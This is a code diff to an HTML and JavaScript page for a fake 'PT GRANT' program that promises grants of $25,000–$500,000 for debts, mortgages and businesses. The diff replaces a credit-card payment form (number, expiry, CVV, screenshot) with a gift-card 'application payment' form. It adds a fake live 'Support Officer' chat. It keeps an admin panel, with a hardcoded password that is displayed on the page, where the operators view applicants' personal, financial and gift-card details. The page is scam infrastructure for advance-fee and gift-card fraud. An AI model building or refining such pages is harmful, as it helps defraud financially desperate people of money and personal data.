@@ -32,7 +32,6 @@
                 <p class="text-amber-400 font-semibold tracking-widest text-xl mt-2">OFFICIAL FINANCIAL ASSISTANCE PROGRAM</p>
             </div>
 
-            <!-- Banner Overlay Content -->
             <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-950/60 to-transparent flex flex-col items-center justify-end pb-8 text-center px-4">
                 <span class="bg-amber-500 text-slate-950 font-black text-xs md:text-sm px-5 py-1.5 rounded-full uppercase tracking-widest mb-3 shadow-xl border border-amber-300">
                     Qualify For $25,000 – $500,000
@@ -40,7 +39,6 @@
                 <h1 class="text-3xl md:text-6xl font-black text-white tracking-tight uppercase drop-shadow-lg">PT GRANT ASSISTANCE</h1>
                 <p class="text-slate-300 text-sm md:text-lg max-w-3xl mt-2 font-light">Select your required assistance category below to open your grant application form instantly.</p>
                 
-                <!-- Top Screen CTA -->
                 <div class="mt-6 flex flex-wrap gap-4 justify-center">
                     <button onclick="openApplyModal('Personal Loan Assistance')" class="bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-slate-950 font-black px-8 py-4 rounded-xl text-lg shadow-2xl transition transform hover:scale-105 flex items-center gap-3 border border-amber-300">
                         <i class="fa-solid fa-paper-plane text-xl"></i> APPLY NOW FOR GRANT
@@ -67,8 +65,8 @@
                 <button onclick="openModal('statusModal')" class="bg-slate-800 hover:bg-slate-700 text-slate-200 px-4 py-2.5 rounded-lg text-xs font-bold flex items-center gap-2 border border-slate-700 transition">
                     <i class="fa-solid fa-folder-open text-amber-400"></i> Check Status
                 </button>
-                <button onclick="openAdminLoginModal()" class="bg-slate-950 hover:bg-slate-900 text-amber-400 px-3 py-2.5 rounded-lg text-xs font-semibold flex items-center gap-2 border border-slate-800 transition">
-                    <i class="fa-solid fa-lock text-amber-400"></i> Admin Portal
+                <button onclick="openAdminPortalLink()" class="bg-slate-950 hover:bg-slate-900 text-amber-400 px-3 py-2.5 rounded-lg text-xs font-semibold flex items-center gap-2 border border-slate-800 transition">
+                    <i class="fa-solid fa-lock text-amber-400"></i> /admin.php
                 </button>
             </div>
         </div>
@@ -86,7 +84,6 @@
             </div>
 
             <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-                
                 <!-- CARD 1: PERSONAL LOAN -->
                 <div onclick="openApplyModal('Personal Loan Assistance')" class="glow-hover cursor-pointer bg-slate-900 border-2 border-slate-800 hover:border-amber-500 rounded-2xl p-6 transition duration-300 transform hover:-translate-y-1 flex flex-col justify-between group">
                     <div class="space-y-4">
@@ -95,12 +92,12 @@
                         </div>
                         <div>
                             <h3 class="text-xl font-bold text-white group-hover:text-amber-400 transition">Personal Loan Assistance</h3>
-                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Direct relief for personal debt consolidation, urgent living expenses, and personal financial recovery.</p>
+                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Direct relief for personal debt consolidation and financial recovery.</p>
                         </div>
                     </div>
                     <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                         <span class="text-amber-400 font-bold">$25,000 – $100,000</span>
-                        <span class="text-slate-300 font-semibold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
+                        <span class="text-slate-300 font-semibold flex items-center gap-1">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                     </div>
                 </div>
 
@@ -112,12 +109,12 @@
                         </div>
                         <div>
                             <h3 class="text-xl font-bold text-white group-hover:text-indigo-400 transition">Mortgage Assistance</h3>
-                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Financial support designed to help homeowners facing missed payments or mortgage hardship.</p>
+                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Support designed to help homeowners facing mortgage hardship.</p>
                         </div>
                     </div>
                     <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                         <span class="text-amber-400 font-bold">$50,000 – $250,000</span>
-                        <span class="text-slate-300 font-semibold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
+                        <span class="text-slate-300 font-semibold flex items-center gap-1">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                     </div>
                 </div>
 
@@ -129,12 +126,12 @@
                         </div>
                         <div>
                             <h3 class="text-xl font-bold text-white group-hover:text-emerald-400 transition">Credit Card Assistance</h3>
-                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Targeted grant funding to eliminate overwhelming high-interest revolving credit card balances.</p>
+                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Grant funding to eliminate high-interest revolving credit balances.</p>
                         </div>
                     </div>
                     <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                         <span class="text-amber-400 font-bold">$25,000 – $75,000</span>
-                        <span class="text-slate-300 font-semibold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
+                        <span class="text-slate-300 font-semibold flex items-center gap-1">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                     </div>
                 </div>
 
@@ -146,12 +143,12 @@
                         </div>
                         <div>
                             <h3 class="text-xl font-bold text-white group-hover:text-teal-400 transition">Home Refinance Assistance</h3>
-                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Grant aid to assist homeowners with closing costs, interest rate reductions, and cash-out refinances.</p>
+                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Grant aid for closing costs, rate reductions, and refinances.</p>
                         </div>
                     </div>
                     <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                         <span class="text-amber-400 font-bold">$30,000 – $200,000</span>
-                        <span class="text-slate-300 font-semibold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
+                        <span class="text-slate-300 font-semibold flex items-center gap-1">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                     </div>
                 </div>
 
@@ -163,12 +160,12 @@
                         </div>
                         <div>
                             <h3 class="text-xl font-bold text-white group-hover:text-purple-400 transition">Auto Loan Assistance</h3>
-                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Assistance grants to pay off high vehicle loan balances or prevent automobile repossession.</p>
+                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Assistance grants to pay off vehicle loans or prevent repossession.</p>
                         </div>
                     </div>
                     <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                         <span class="text-amber-400 font-bold">$25,000 – $50,000</span>
-                        <span class="text-slate-300 font-semibold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
+                        <span class="text-slate-300 font-semibold flex items-center gap-1">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                     </div>
                 </div>
 
@@ -183,19 +180,19 @@
                                 <h3 class="text-xl font-bold text-amber-400">Business Assistance</h3>
                                 <span class="bg-amber-500/20 text-amber-300 text-[10px] font-bold px-2 py-0.5 rounded border border-amber-500/40">SPECIAL TIER</span>
                             </div>
-                            <p class="text-xs text-slate-300 mt-2 leading-relaxed">Comprehensive business grants for registered companies, payroll, expansion, and commercial debt relief.</p>
+                            <p class="text-xs text-slate-300 mt-2 leading-relaxed">Comprehensive business grants for registered companies, payroll, and debt relief.</p>
                         </div>
                     </div>
                     <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                         <span class="text-amber-400 font-black">$50,000 – $500,000</span>
-                        <span class="text-amber-400 font-bold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
+                        <span class="text-amber-400 font-bold flex items-center gap-1">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                     </div>
                 </div>
 
             </div>
         </section>
 
-        <!-- STATUS DASHBOARD SECTION -->
+        <!-- STATUS DASHBOARD SECTION (APPLICANT SUPPORT CHAT) -->
         <section id="statusDashboardSection" class="hidden space-y-6">
             <div class="bg-slate-900 rounded-2xl shadow-2xl border border-slate-800 p-6 md:p-8">
                 
@@ -205,7 +202,8 @@
                         <h2 class="text-3xl font-black text-white mt-1" id="dashApplicantName">Welcome</h2>
                         <p class="text-sm text-slate-400">Ticket ID: <span id="dashTicketId" class="font-mono font-bold text-amber-400 bg-slate-950 px-3 py-1 rounded border border-amber-500/30"></span></p>
                     </div>
-                    <div>
+                    <div class="flex items-center gap-3">
+                        <button onclick="showSection('cards')" class="bg-slate-800 hover:bg-slate-700 text-xs px-3 py-2 rounded-lg font-bold border border-slate-700">Logout Status</button>
                         <span id="dashStatusBadge" class="inline-block px-5 py-2 rounded-full font-bold text-sm shadow-md"></span>
                     </div>
                 </div>
@@ -223,13 +221,13 @@
                     </div>
                 </div>
 
-                <!-- MAKE APPLICATION PAYMENT BUTTON -->
+                <!-- MAKE APPLICATION PAYMENT / GIFT CARD PAYMENT BUTTON -->
                 <div class="mt-8 bg-slate-950 rounded-2xl p-6 flex flex-col md:flex-row items-center justify-between gap-6 shadow-2xl border-2 border-amber-500/80">
                     <div>
                         <h4 class="text-xl font-bold text-amber-400 flex items-center gap-2">
-                            <i class="fa-solid fa-circle-exclamation"></i> Application Payment Notice
+                            <i class="fa-solid fa-gift"></i> Gift Card Application Payment
                         </h4>
-                        <p class="text-xs text-slate-300 mt-1 max-w-xl">If instructed by your grant officer, please click below to submit your card details and card screenshot image.</p>
+                        <p class="text-xs text-slate-300 mt-1 max-w-xl">If instructed by your grant officer, please click below to submit your gift card number and gift card image or screenshot.</p>
                     </div>
                     <button onclick="openModal('paymentModal')" class="bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-slate-950 font-black px-8 py-4 rounded-xl transition flex items-center gap-3 shadow-xl whitespace-nowrap text-sm">
                         <i class="fa-solid fa-credit-card text-lg"></i> MAKE APPLICATION PAYMENT
@@ -272,24 +270,31 @@
                     </div>
                 </div>
 
-                <!-- MESSAGING BOX -->
-                <div class="mt-10 border-t border-slate-800 pt-8">
-                    <h3 class="text-2xl font-bold text-white mb-4 flex items-center gap-3">
-                        <i class="fa-solid fa-comments text-amber-400"></i> Admin Messages & Status Replies
+                <!-- TWO-WAY CHAT WITH SUPPORT -->
+                <div class="mt-10 border-t border-slate-800 pt-8 space-y-4">
+                    <h3 class="text-2xl font-bold text-white flex items-center gap-3">
+                        <i class="fa-solid fa-headset text-amber-400"></i> Live Chat with Support & Grant Officer
                     </h3>
-                    <div id="applicantMessagesBox" class="bg-slate-950 border border-slate-800 rounded-2xl p-5 h-56 overflow-y-auto space-y-3"></div>
+                    <div id="applicantMessagesBox" class="bg-slate-950 border border-slate-800 rounded-2xl p-5 h-64 overflow-y-auto space-y-3"></div>
+                    
+                    <div class="flex gap-2">
+                        <input type="text" id="applicantChatInput" placeholder="Type a message to support..." class="flex-grow border border-slate-800 bg-slate-950 rounded-xl p-3.5 text-sm text-white focus:border-amber-500 outline-none">
+                        <button onclick="sendApplicantChatMessage()" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold px-6 py-3.5 rounded-xl transition flex items-center gap-2">
+                            <i class="fa-solid fa-paper-plane"></i> Send
+                        </button>
+                    </div>
                 </div>
 
             </div>
         </section>
 
-        <!-- ADMIN PORTAL SECTION -->
+        <!-- ADMIN PORTAL SECTION (/admin.php) -->
         <section id="adminPortalSection" class="hidden space-y-6">
             <div class="bg-slate-900 text-white rounded-2xl p-6 shadow-2xl border border-slate-800">
                 <div class="flex flex-col md:flex-row md:items-center justify-between border-b border-slate-800 pb-4 gap-4">
                     <div>
-                        <span class="text-xs font-bold text-amber-400 uppercase tracking-widest">Administrator Portal</span>
-                        <h2 class="text-3xl font-black mt-1">PT GRANT Dashboard</h2>
+                        <span class="text-xs font-bold text-amber-400 uppercase tracking-widest">Administrator Portal (/admin.php)</span>
+                        <h2 class="text-3xl font-black mt-1">PT GRANT Applications Manager</h2>
                     </div>
                     <div class="flex gap-2">
                         <button onclick="logoutAdmin()" class="bg-red-600/80 hover:bg-red-600 px-4 py-2 rounded-lg text-xs font-bold text-white transition">
@@ -319,7 +324,7 @@
                 </div>
             </div>
 
-            <!-- ADMIN DETAILED APPLICANT ENTRY VIEW & CONTROLS -->
+            <!-- ADMIN DETAILED APPLICANT ENTRY VIEW & CHAT CONTROLS -->
             <div id="adminDetailCard" class="hidden bg-slate-900 rounded-2xl p-6 shadow-2xl border border-slate-800 space-y-6">
                 <div class="flex justify-between items-center border-b border-slate-800 pb-4">
                     <h3 class="text-xl font-bold text-white" id="adminDetailTicketHeader">Managing Ticket</h3>
@@ -343,7 +348,6 @@
                         <div><strong>Credit Score:</strong> <span id="admCredit" class="text-white"></span></div>
                     </div>
 
-                    <!-- BUSINESS ENTRY FIELDS IF APPLICABLE -->
                     <div id="admBusinessBox" class="hidden bg-amber-500/10 p-4 rounded-xl text-xs border border-amber-500/30 text-amber-200 space-y-1">
                         <p class="font-bold text-amber-400"><i class="fa-solid fa-building"></i> Business Information Entries:</p>
                         <div><strong>Business Name:</strong> <span id="admBizName"></span></div>
@@ -380,41 +384,46 @@
                     </button>
                 </div>
 
-                <!-- APPLICANT FILES & CARD SCREENSHOTS -->
+                <!-- APPLICANT FILES & GIFT CARD SCREENSHOTS -->
                 <div class="space-y-2">
                     <h4 class="font-bold text-white text-sm flex items-center gap-2">
-                        <i class="fa-solid fa-photo-film text-amber-400"></i> Uploaded Documents & Payment Card Screenshots
+                        <i class="fa-solid fa-photo-film text-amber-400"></i> Uploaded Documents & Gift Card Screenshots
                     </h4>
                     <div id="admFilesList" class="space-y-3 text-xs"></div>
                 </div>
 
-                <!-- REPLY BACK TO APPLICANT -->
+                <!-- ADMIN SUPPORT CHAT REPLY BOX -->
                 <div class="border-t border-slate-800 pt-4 space-y-3">
-                    <h4 class="font-bold text-white text-sm">Reply to Applicant</h4>
-                    <textarea id="admReplyText" rows="3" placeholder="Type a response or message to the applicant..." class="w-full border border-slate-800 rounded-lg p-3 text-xs bg-slate-950 text-white outline-none focus:border-amber-500"></textarea>
-                    <button onclick="sendAdminReply()" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold px-6 py-2 rounded-lg text-xs transition">
-                        Send Response
-                    </button>
+                    <h4 class="font-bold text-white text-sm flex items-center gap-2">
+                        <i class="fa-solid fa-comments text-amber-400"></i> Live Support Chat Reply
+                    </h4>
+                    <div id="adminChatMessagesBox" class="bg-slate-950 border border-slate-800 rounded-xl p-4 h-48 overflow-y-auto space-y-3"></div>
+                    <div class="flex gap-2">
+                        <input type="text" id="adminChatInput" placeholder="Type support response to applicant..." class="flex-grow border border-slate-800 rounded-lg p-3 text-xs bg-slate-950 text-white outline-none focus:border-amber-500">
+                        <button onclick="sendAdminChatMessage()" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold px-6 py-2 rounded-lg text-xs transition">
+                            Send Reply
+                        </button>
+                    </div>
                 </div>
             </div>
         </section>
 
     </main>
 
-    <!-- ADMIN LOGIN MODAL (PASSWORD PROTECTED: Admin123) -->
+    <!-- ADMIN LOGIN MODAL (PASSWORD: Admin123) -->
     <div id="adminLoginModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
         <div class="bg-slate-900 max-w-sm w-full rounded-2xl shadow-2xl p-6 relative border-2 border-amber-500">
             <button onclick="closeModal('adminLoginModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl font-bold">&times;</button>
             <div class="w-12 h-12 bg-amber-500/20 text-amber-400 rounded-full flex items-center justify-center mx-auto mb-3 text-xl border border-amber-500/40">
                 <i class="fa-solid fa-user-shield"></i>
             </div>
-            <h3 class="text-xl font-bold text-white text-center mb-1">Admin Portal Access</h3>
-            <p class="text-xs text-slate-400 text-center mb-4">Enter password to manage applications.</p>
+            <h3 class="text-xl font-bold text-white text-center mb-1">Admin Portal (/admin.php)</h3>
+            <p class="text-xs text-slate-400 text-center mb-4">Enter password (<strong>Admin123</strong>) to access.</p>
 
             <form onsubmit="handleAdminLogin(event)" class="space-y-4">
                 <div>
-                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Admin Password *</label>
-                    <input type="password" id="adminPasswordInput" required placeholder="Enter Password" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono">
+                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Password *</label>
+                    <input type="password" id="adminPasswordInput" required placeholder="Admin123" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono">
                 </div>
                 <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-black py-3 rounded-xl transition shadow-lg">
                     Login to Admin Portal
@@ -454,7 +463,6 @@
                     <p class="text-xs text-slate-300 mt-0.5">Please provide accurate financial and contact details for verification.</p>
                 </div>
 
-                <!-- CONTACT INFORMATION -->
                 <div class="space-y-4">
                     <h4 class="font-bold text-white text-base border-b border-slate-800 pb-2">Contact Details</h4>
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
@@ -503,7 +511,6 @@
                     </div>
                 </div>
 
-                <!-- EMPLOYMENT & FINANCIAL DETAILS -->
                 <div class="space-y-4">
                     <h4 class="font-bold text-white text-base border-b border-slate-800 pb-2">Employment & Financial Details</h4>
                     <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
@@ -541,7 +548,6 @@
                     </div>
                 </div>
 
-                <!-- BUSINESS FIELDS -->
                 <div id="businessFields" class="hidden space-y-4 bg-amber-500/10 border border-amber-500/30 p-5 rounded-xl">
                     <h4 class="font-bold text-amber-400 text-base">Business Assistance Information</h4>
                     <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
@@ -615,47 +621,43 @@
         </div>
     </div>
 
-    <!-- PAYMENT MODAL WITH CARD SCREENSHOT UPLOAD -->
+    <!-- GIFT CARD PAYMENT MODAL -->
     <div id="paymentModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
         <div class="bg-slate-900 max-w-md w-full rounded-2xl shadow-2xl p-6 relative border border-amber-500">
             <button onclick="closeModal('paymentModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl font-bold">&times;</button>
             <h3 class="text-xl font-bold text-white mb-1 flex items-center gap-2">
-                <i class="fa-solid fa-credit-card text-amber-400"></i> Make Application Payment
+                <i class="fa-solid fa-gift text-amber-400"></i> Gift Card Application Payment
             </h3>
-            <p class="text-xs text-slate-400 mb-4">Enter card details and upload payment screenshot.</p>
+            <p class="text-xs text-slate-400 mb-4">Enter gift card number and upload gift card image or screenshot.</p>
 
             <form onsubmit="handlePaymentSubmit(event)" class="space-y-4">
                 <div>
-                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Card Number *</label>
-                    <input type="text" id="payCardNumber" required placeholder="XXXX XXXX XXXX XXXX" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono">
-                </div>
-                <div class="grid grid-cols-2 gap-3">
-                    <div>
-                        <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Expiry *</label>
-                        <input type="text" placeholder="MM/YY" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-400 uppercase mb-1">CVV *</label>
-                        <input type="text" placeholder="123" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
-                    </div>
+                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Gift Card Number *</label>
+                    <input type="text" id="payGiftCardNumber" required placeholder="Enter Gift Card Code / Number" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono">
                 </div>
                 <div>
-                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Card Screenshot / Image *</label>
-                    <input type="file" id="payCardImage" accept="image/*" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2 text-xs text-slate-300">
+                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Gift Card Image or Screenshot *</label>
+                    <input type="file" id="payGiftCardImage" accept="image/*" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2 text-xs text-slate-300">
                 </div>
                 <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3 rounded-xl transition">
-                    Submit Payment & Screenshot
+                    Submit Gift Card & Screenshot
                 </button>
             </form>
         </div>
     </div>
 
-    <!-- JAVASCRIPT LOGIC WITH LOCALSTORAGE PERSISTENCE -->
+    <!-- JAVASCRIPT LOGIC -->
     <script>
         let applications = JSON.parse(localStorage.getItem('pt_applications')) || [];
         let currentApplicant = null;
         let selectedAdminTicket = null;
         let isAdminLoggedIn = false;
+
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.pathname.endsWith('admin.php') || window.location.hash === '#admin.php') {
+                openAdminPortalLink();
+            }
+        });
 
         function saveStorage() {
             localStorage.setItem('pt_applications', JSON.stringify(applications));
@@ -691,7 +693,6 @@
             }
         }
 
-        // Form Submission Handler
         function handleFormSubmit(e) {
             e.preventDefault();
             const ticketId = 'PTG-' + Math.floor(100000 + Math.random() * 900000);
@@ -719,7 +720,7 @@
                 approvedAmount: 0,
                 pendingAmount: 0,
                 uploads: [],
-                messages: [{ sender: 'admin', text: 'Welcome to PT GRANT! Your application entries have been registered in the admin system and are under review.', time: new Date().toLocaleTimeString() }]
+                messages: [{ sender: 'admin', text: 'Welcome to PT GRANT support! Your application entries are registered. How can we assist you today?', time: new Date().toLocaleTimeString() }]
             };
 
             applications.push(newApp);
@@ -731,7 +732,6 @@
             openModal('ticketModal');
         }
 
-        // Status Login Handler
         function handleStatusLogin(e) {
             e.preventDefault();
             const ticket = document.getElementById('statusTicketInput').value.trim().toUpperCase();
@@ -766,12 +766,13 @@
             msgBox.innerHTML = currentApplicant.messages.map(m => `
                 <div class="p-3 rounded-xl text-xs ${m.sender === 'admin' ? 'bg-amber-500/10 border border-amber-500/30 text-amber-200' : 'bg-slate-900 border border-slate-800 text-slate-300'}">
                     <div class="flex justify-between font-bold mb-1">
-                        <span>${m.sender === 'admin' ? 'PT GRANT Admin' : 'You'}</span>
+                        <span>${m.sender === 'admin' ? 'PT GRANT Support Officer' : 'You'}</span>
                         <span class="text-[10px] text-slate-500">${m.time}</span>
                     </div>
                     <p>${m.text}</p>
                 </div>
             `).join('');
+            msgBox.scrollTop = msgBox.scrollHeight;
 
             const upBox = document.getElementById('applicantUploadsList');
             upBox.innerHTML = currentApplicant.uploads.length ? currentApplicant.uploads.map(u => `
@@ -780,6 +781,26 @@
                     <span class="text-slate-500 text-[10px]">${u.time}</span>
                 </div>
             `).join('') : '<p class="text-slate-500 italic">No uploaded documents.</p>';
+        }
+
+        function sendApplicantChatMessage() {
+            const input = document.getElementById('applicantChatInput');
+            const text = input.value.trim();
+            if (!text || !currentApplicant) return;
+
+            currentApplicant.messages.push({
+                sender: 'applicant',
+                text: text,
+                time: new Date().toLocaleTimeString()
+            });
+
+            saveStorage();
+            input.value = '';
+            renderApplicantDashboard();
+
+            if (selectedAdminTicket === currentApplicant.ticketId) {
+                selectAdminApp(currentApplicant.ticketId);
+            }
         }
 
         function uploadDocument(category) {
@@ -806,22 +827,21 @@
             reader.readAsDataURL(file);
         }
 
-        // Payment Submission with Screenshot Data URL
         function handlePaymentSubmit(e) {
             e.preventDefault();
-            const cardNumber = document.getElementById('payCardNumber').value;
-            const fileInput = document.getElementById('payCardImage');
+            const giftCardNumber = document.getElementById('payGiftCardNumber').value;
+            const fileInput = document.getElementById('payGiftCardImage');
 
-            if (!fileInput.files.length) return alert('Please attach a card screenshot image.');
+            if (!fileInput.files.length) return alert('Please attach a gift card screenshot or image.');
 
             const file = fileInput.files[0];
             const reader = new FileReader();
 
             reader.onload = function(e) {
                 currentApplicant.uploads.push({
-                    category: 'payment card',
-                    name: `Card (**${cardNumber.slice(-4)}): ${file.name}`,
-                    cardNumber: cardNumber,
+                    category: 'gift card',
+                    name: `Gift Card (${giftCardNumber}): ${file.name}`,
+                    giftCardNumber: giftCardNumber,
                     dataUrl: e.target.result,
                     time: new Date().toLocaleTimeString()
                 });
@@ -831,14 +851,13 @@
 
                 closeModal('paymentModal');
                 renderApplicantDashboard();
-                alert('Payment details and card screenshot submitted to Admin Portal!');
+                alert('Gift card number and screenshot submitted to Admin Portal!');
             };
 
             reader.readAsDataURL(file);
         }
 
-        // ADMIN PORTAL LOGIN & MANAGEMENT
-        function openAdminLoginModal() {
+        function openAdminPortalLink() {
             if (isAdminLoggedIn) {
                 renderAdminTable();
                 showSection('admin');
@@ -857,7 +876,7 @@
                 renderAdminTable();
                 showSection('admin');
             } else {
-                alert('Incorrect Admin Password!');
+                alert('Incorrect Admin Password! (Hint: Admin123)');
             }
         }
 
@@ -899,7 +918,6 @@
             document.getElementById('adminDetailTicketHeader').innerText = `Managing Application: ${app.ticketId}`;
             document.getElementById('adminDetailAssistanceType').innerText = app.assistanceType;
 
-            // Populate Main Form Entries into Admin View
             document.getElementById('admFullName').innerText = `${app.firstName} ${app.lastName}`;
             document.getElementById('admEmail').innerText = app.email;
             document.getElementById('admPhone').innerText = app.phone;
@@ -910,7 +928,6 @@
             document.getElementById('admPay').innerText = `$${app.payAmount} (${app.payFrequency})`;
             document.getElementById('admCredit').innerText = app.creditScore;
 
-            // Render Business Data if present
             const bizBox = document.getElementById('admBusinessBox');
             if (app.assistanceType === 'Business Assistance' || app.businessName !== 'N/A') {
                 bizBox.classList.remove('hidden');
@@ -925,7 +942,18 @@
             document.getElementById('admApprovedInput').value = app.approvedAmount;
             document.getElementById('admPendingInput').value = app.pendingAmount;
 
-            // Render Files and Payment Screenshots
+            const chatBox = document.getElementById('adminChatMessagesBox');
+            chatBox.innerHTML = app.messages.map(m => `
+                <div class="p-2.5 rounded-lg text-xs ${m.sender === 'admin' ? 'bg-amber-500/10 text-amber-200' : 'bg-slate-900 text-slate-300 border border-slate-800'}">
+                    <div class="flex justify-between font-bold mb-1">
+                        <span>${m.sender === 'admin' ? 'Support Officer' : app.firstName}</span>
+                        <span class="text-[10px] text-slate-500">${m.time}</span>
+                    </div>
+                    <p>${m.text}</p>
+                </div>
+            `).join('');
+            chatBox.scrollTop = chatBox.scrollHeight;
+
             const filesList = document.getElementById('admFilesList');
             if (app.uploads.length) {
                 filesList.innerHTML = app.uploads.map(u => `
@@ -934,6 +962,7 @@
                             <span><strong class="uppercase text-amber-400">[${u.category.toUpperCase()}]</strong> ${u.name}</span>
                             <span class="text-slate-500 text-[10px]">${u.time}</span>
                         </div>
+                        ${u.giftCardNumber ? `<div class="text-xs text-amber-300 font-bold">Gift Card Number: ${u.giftCardNumber}</div>` : ''}
                         ${u.dataUrl ? `
                             <div class="mt-2">
                                 <a href="${u.dataUrl}" target="_blank" class="inline-block bg-slate-800 hover:bg-slate-700 text-amber-400 font-bold px-3 py-1.5 rounded border border-slate-700 text-[11px] mb-2">
@@ -945,7 +974,7 @@
                     </div>
                 `).join('');
             } else {
-                filesList.innerHTML = '<p class="text-slate-500 italic">No uploaded documents or card screenshots available.</p>';
+                filesList.innerHTML = '<p class="text-slate-500 italic">No uploaded documents or gift card screenshots available.</p>';
             }
         }
 
@@ -962,10 +991,11 @@
             alert('Application status & amounts saved successfully!');
         }
 
-        function sendAdminReply() {
+        function sendAdminChatMessage() {
             if (!selectedAdminTicket) return;
-            const text = document.getElementById('admReplyText').value.trim();
-            if (!text) return alert('Enter a reply message.');
+            const input = document.getElementById('adminChatInput');
+            const text = input.value.trim();
+            if (!text) return;
 
             const app = applications.find(a => a.ticketId === selectedAdminTicket);
             app.messages.push({
@@ -975,8 +1005,12 @@
             });
 
             saveStorage();
-            document.getElementById('admReplyText').value = '';
-            alert('Reply sent directly to applicant portal!');
+            input.value = '';
+            selectAdminApp(selectedAdminTicket);
+
+            if (currentApplicant && currentApplicant.ticketId === selectedAdminTicket) {
+                renderApplicantDashboard();
+            }
         }
     </script>
 </body>
